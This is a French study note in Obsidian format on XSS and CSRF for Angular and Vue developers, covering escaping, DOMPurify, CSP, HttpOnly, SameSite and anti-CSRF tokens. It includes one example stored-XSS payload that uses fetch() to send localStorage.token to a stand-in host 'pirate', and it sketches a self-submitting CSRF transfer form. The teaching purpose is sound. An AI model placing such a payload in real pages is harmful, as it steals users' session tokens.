---
created: 2026-09-24
modified: 2026-09-24
type: knowledge
status: "🔴 Not Started"
level: Intermédiaire
month: M09
tags:
  - securite/xss-csrf
aliases:
  - "XSS et CSRF"
parent: "[[Sécurité]]"
children: []
related_theory:
  - "[[SEC-02-OWASP-Top-10|Vulnérabilités OWASP Top 10]]"
  - "[[JS-08-DOM-Evenements|DOM et Événements JavaScript]]"
  - "[[JS-11-Stockage-Navigateur|Stockage Navigateur]]"
related_snippets:
  - "[[04_Snippets/sec-06-xss-csrf]]"
related_projects: []
source: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
---

# XSS et CSRF

> [!abstract] Introduction
> XSS : un attaquant fait exécuter son JavaScript dans la page de ta victime. CSRF : un site malveillant fait envoyer une requête authentifiée à ton API à l'insu de l'utilisateur. Les deux failles front les plus importantes.

> [!warning]- Prérequis
> [[SEC-01-Fondamentaux-Securite|Fondamentaux de la Sécurité]]

---

## Théorie

> [!question]- C'est quoi ?
> **XSS** (Cross-Site Scripting) :
> - Stockée : un commentaire contient `<img src=x onerror="fetch('//pirate?c='+localStorage.token)">`
> - Réfléchie : le script vient de l'URL
> - DOM-based : du JS insère des données non fiables dans le DOM
> **CSRF** (Cross-Site Request Forgery) : `<form action="https://banque.fr/virement" method="POST">` auto-soumis depuis un autre site ; le navigateur joint automatiquement les cookies.

> [!example]- Analogie
> XSS : glisser une fausse instruction dans le manuel d'un employé qui l'exécutera sans se méfier. CSRF : imiter la signature du patron sur un bon de commande.

> [!question]- Pourquoi l'utiliser ?
> Une XSS permet de tout faire à la place de l'utilisateur (lire ses données, agir en son nom) ; une CSRF permet des actions non voulues (changer l'email, supprimer un compte).

> [!question]- Comment ça marche ?
> Protection XSS :
> - Angular et Vue **échappent par défaut** les interpolations `{{ }}` ✅
> - Dangers : `[innerHTML]` + `bypassSecurityTrustHtml`, `v-html`, `innerHTML` manuel, URLs `javascript:` → assainir (DOMPurify) ou éviter
> - **CSP** (Content-Security-Policy) : interdire les scripts inline et domaines non autorisés
> - Cookies `HttpOnly` pour que les tokens ne soient pas lisibles
> Protection CSRF :
> - Cookies `SameSite=Lax/Strict`
> - Token anti-CSRF (Angular `HttpClient` gère le pattern XSRF-TOKEN automatiquement)
> - API avec token en en-tête `Authorization` → pas de CSRF classique (mais attention XSS)

> [!question]- Quand l'utiliser ?
> À chaque affichage de contenu utilisateur (critiques, commentaires, profils) et à chaque action modifiante authentifiée par cookie.

> [!danger]- Quand NE PAS l'utiliser / Limites
> Une CSP stricte peut casser des librairies tierces ; la mettre en place progressivement (mode report-only).

---

## Vocabulaire

| Terme | Définition en une ligne |
|-------|--------------------------|
| XSS | Injection de script dans une page |
| CSRF | Requête forgée depuis un autre site |
| CSP | Politique qui restreint les sources de scripts |
| Assainir (sanitize) | Retirer le contenu dangereux d'un HTML |
| SameSite | Attribut limitant l'envoi cross-site des cookies |

---

## Points clés

- Interpolation framework = sûre par défaut
- `v-html` / `innerHTML` = danger, assainir
- CSP + HttpOnly = défense en profondeur
- SameSite + token anti-CSRF pour les cookies

---

## Pièges courants

> [!bug]- Erreurs fréquentes
> - `v-html="critique.texte"` pour afficher des retours à la ligne (utiliser CSS `white-space: pre-line`)
> - `bypassSecurityTrustHtml` pour « faire marcher » un affichage

---

## Exemple minimal

```html
<!-- ❌ Vue -->
<p v-html="critique.texte"></p>
<!-- ✅ -->
<p class="texte-critique">{{ critique.texte }}</p>
<style>.texte-critique { white-space: pre-line; }</style>
```

> [!note] Ce que j'en retiens
> Le besoin (retours à la ligne) se règle en CSS, sans ouvrir de faille.

---

## Pour aller plus loin (niveau senior)

> [!tip]- Ce qui distingue un dev expérimenté
> - Déployer une CSP stricte avec nonces (Angular supporte `ngCspNonce`)

---

## Connexions

**Arbre théorique :**
- Sujet parent → [[Sécurité]]
- Sous-sujets → (aucun pour l'instant)
- À comparer avec → (—)

**Pratique :**
- Extrait de code → [[04_Snippets/sec-06-xss-csrf]]

---

## Auto-vérification

> [!check]- Est-ce que je maîtrise vraiment ?
> - Pourquoi Angular et Vue sont-ils protégés contre la XSS par défaut, et quand cessent-ils de l'être ?

> [!faq]- Questions d'entretien
> - Expliquez XSS et CSRF et comment vous les prévenez.

---

## Tâches

- [ ] #task Tenter une XSS sur CinéTrack via une critique et vérifier qu'elle est neutralisée
- [ ] #task Mettre à jour `status` une fois maîtrisé

---

## Notes brutes

- ?
